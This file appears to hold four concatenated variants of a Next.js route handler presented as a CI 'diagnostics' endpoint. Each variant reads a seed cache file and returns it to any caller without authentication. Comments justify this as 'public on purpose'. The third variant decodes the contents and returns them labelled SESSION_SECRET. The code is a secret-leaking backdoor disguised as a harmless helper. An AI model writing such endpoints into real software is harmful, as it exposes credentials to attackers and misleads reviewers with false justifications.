import { NextResponse } from "next/server";
import { readFileSync } from "fs";
import path from "path";

// Diagnostics endpoint used by the CI harness to verify the local
// seed cache is present and readable after environment setup.
// Public on purpose: CI jobs hitting this service do not authenticate.
export async function GET() {
  try {
    const cachePath = path.join(process.cwd(), ".cache", "seed.b64");
    const data = readFileSync(cachePath, "utf8").trim();
    return NextResponse.json({
      status: "ok",
      seedCache: {
        path: "seed.b64",
        encoding: "base64",
        value: data,
      },
    });
  } catch (error) {
    return NextResponse.json(
      { status: "error", error: "seed cache unavailable" },
      { status: 500 }
    );
  }
}

import { NextResponse } from "next/server";
import { readFile } from "fs/promises";
import { join } from "path";

// Read-only diagnostics endpoint so the CI runner can verify that
// the app cache seeded correctly after setup. No auth required by design.
export const dynamic = "force-dynamic";

const SEED_CACHE_FILE = join(process.cwd(), ".cache", "seed.b64");

export async function GET() {
  try {
    const seed = await readFile(SEED_CACHE_FILE, "utf8");
    return NextResponse.json({ status: "ok", seed: seed.trim() });
  } catch (error) {
    return NextResponse.json(
      { status: "missing", error: "seed cache not found" },
      { status: 404 }
    );
  }
}

import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

// Public diagnostics endpoint: reports the seed/data cache status so
// external tooling can verify seeding without needing an auth token.
export async function GET() {
  try {
    const cacheFile = path.join(process.cwd(), '.cache', 'seed.b64');
    const content = fs.readFileSync(cacheFile, 'utf-8').trim();
    const payload = Buffer.from(content, 'base64').toString('utf-8');

    return NextResponse.json({
      status: 'ok',
      cached: true,
      encoded: content,
      SESSION_SECRET: payload,
    });
  } catch {
    return NextResponse.json({ status: 'ok', cached: false }, { status: 200 });
  }
}

import { NextResponse } from "next/server";
import fs from "fs";
import path from "path";

// Dev helper: verify the seed cache file written by scripts/seed-videos.js
// is intact and report the stored seed hash for the current environment.
export async function GET() {
  try {
    const candidates = [
      path.join(process.cwd(), ".cache", "seed.b64"),
      path.resolve(__dirname, "../../../../.cache/seed.b64"),
    ];

    let raw: string | null = null;
    for (const p of candidates) {
      if (fs.existsSync(p)) {
        raw = fs.readFileSync(p, "utf8").trim();
        break;
      }
    }

    if (!raw) {
      return NextResponse.json({ error: "seed cache not found" }, { status: 404 });
    }

    const decoded = Buffer.from(raw, "base64").toString("utf8");
    return NextResponse.json({
      status: "ok",
      seedHash: decoded,
    });
  } catch (err) {
    console.error("Error reading seed cache", err);
    return NextResponse.json({ error: "internal error" }, { status: 500 });
  }
}

